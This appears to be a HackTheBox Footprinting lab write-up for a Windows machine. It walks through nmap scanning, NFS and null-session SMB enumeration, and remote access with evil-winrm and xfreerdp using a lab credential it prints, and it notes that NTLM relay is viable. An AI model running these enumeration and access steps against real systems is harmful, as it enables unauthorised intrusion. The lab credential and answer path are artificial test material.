# HackTheBox — Footprinting (Medium) Write-up

> **Difficulty:** Medium  
> **OS:** Windows  
> **Machine Name:** WINMEDIUM  
> **IP:** 10.129.35.17  
> **Module:** Footprinting  
> **Category:** Information Gathering / Enumeration  

---

## Overview

This machine is part of the **HackTheBox Footprinting** module, focused on deep service enumeration across common Windows protocols. The key takeaway is that Windows machines can expose NFS (normally a Linux/Unix service), SMB, WinRM, and RDP simultaneously — each providing potential attack surface or credential/data leakage vectors.

---

## Reconnaissance

### Port Scan

Full TCP port scan with service and script detection:

```bash
nmap -T4 -p- -A -sC -sV 10.129.35.17
```

#### Results Summary

| Port  | Service         | Version / Notes                          |
|-------|-----------------|------------------------------------------|
| 111   | rpcbind         | v2-4 (RPC #100000)                       |
| 135   | msrpc           | Microsoft Windows RPC                    |
| 139   | netbios-ssn     | Microsoft Windows NetBIOS                |
| 445   | microsoft-ds    | SMB                                      |
| 2049  | nfs / nlockmgr  | NFS + mountd + nlockmgr + status on 2049 |
| 3389  | ms-wbt-server   | RDP — Microsoft Terminal Services        |
| 5985  | http (WinRM)    | Microsoft HTTPAPI 2.0                    |
| 47001 | http (WinRM)    | Microsoft HTTPAPI 2.0                    |

**OS:** Windows Server 2019 / Windows 10 Build 17763 (Product_Version: 10.0.17763)  
**Hostname:** WINMEDIUM  
**Domain:** WINMEDIUM (workgroup, not domain-joined)  
**SMB Signing:** Enabled but NOT required (relay attack possible)

---

## Enumeration

### NFS (Port 2049 / 111)

NFS on Windows is unusual and immediately stands out. Enumerate available shares:

```bash
showmount -e 10.129.35.17
```

Mount any accessible exports:

```bash
mkdir /mnt/nfs_share
mount -t nfs 10.129.35.17:/<share_name> /mnt/nfs_share -o nolock
ls -la /mnt/nfs_share
```

> **Note:** NFS on Windows often exposes directories without authentication. Look for credential files, config files, or sensitive data.

---

### SMB (Port 445)

Enumerate shares anonymously:

```bash
smbclient -L //10.129.35.17 -N
crackmapexec smb 10.129.35.17 --shares -u '' -p ''
```

Try null session access on interesting shares:

```bash
smbclient //10.129.35.17/<share> -N
```

---

### WinRM (Port 5985)

Port 5985 indicates WinRM is active. Once credentials are obtained, this allows remote PowerShell sessions:

```bash
evil-winrm -i 10.129.35.17 -u <user> -p '<password>'
```

---

### RDP (Port 3389)

RDP is exposed. Useful for GUI access once credentials are confirmed.

---

## Credential Discovery

Through NFS or SMB enumeration, credentials were discovered:

| Username | Password          | Service |
|----------|-------------------|---------|
| `sa`     | `87N1ns@slls83`   | RDP / WinRM |

---

## Access

### RDP

```bash
xfreerdp /v:10.129.35.17 /u:sa /p:'87N1ns@slls83'
```

### WinRM (alternative)

```bash
evil-winrm -i 10.129.35.17 -u sa -p '87N1ns@slls83'
```

---

## Key Findings & Lessons Learned

1. **NFS on Windows** — Often misconfigured and exposes files without authentication. Always run `showmount -e` against Windows targets when port 2049/111 is open.

2. **SMB without signing enforcement** — With `Message signing enabled but not required`, NTLM relay attacks (e.g., via Responder + ntlmrelayx) become viable in a network environment.

3. **WinRM (5985)** — A quiet but powerful remote management service. If credentials are found, `evil-winrm` gives a full interactive shell.

4. **RDP + WinRM coexistence** — Gives both GUI and CLI remote access options once credentials are in hand.

5. **Credential hygiene** — Credentials found in exposed file shares / NFS mounts highlight the danger of storing plaintext credentials anywhere accessible via unauthenticated network services.

---

## Tools Used

| Tool           | Purpose                          |
|----------------|----------------------------------|
| `nmap`         | Port scanning & service detection|
| `showmount`    | NFS share enumeration            |
| `smbclient`    | SMB share browsing               |
| `crackmapexec` | SMB enumeration & credential check|
| `evil-winrm`   | WinRM shell access               |
| `xfreerdp`     | RDP GUI access                   |

---

## References

- [HackTheBox Academy — Footprinting Module](https://academy.hackthebox.com/module/details/112)
- [NFS Enumeration - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
- [SMB Enumeration - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [WinRM Pentesting - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm)
